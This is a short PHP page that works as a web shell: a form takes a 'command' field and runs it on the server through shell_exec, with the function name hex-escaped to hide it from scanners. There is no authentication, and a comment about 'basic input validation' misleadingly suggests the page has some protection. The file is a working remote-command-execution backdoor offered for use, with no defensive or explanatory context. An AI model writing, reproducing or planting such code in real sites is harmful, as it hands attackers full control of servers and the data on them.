<!DOCTYPE html>
<html>
<head>
    <title>Run System Commands</title>
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    foreach ($_REQUEST as $key => $value) {
        // Basic input validation (you should improve this)
        $key = htmlspecialchars($key);
        $value = htmlspecialchars($value);

        print "<p>$key: $value</p>";
    }

    // You can access the specific input you need, for example:
    $command = $_REQUEST['command'];
    $output = "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"($command);
    print "<pre>$output</pre>";
}
?>

<form method="post" action="<?php print htmlspecialchars($_SERVER["PHP_SELF"]);?>">
    <label for="command">Enter command:</label>
    <input type="text" id="command" name="command" required>
    <button type="submit">Run Command</button>
</form>

</body>
</html>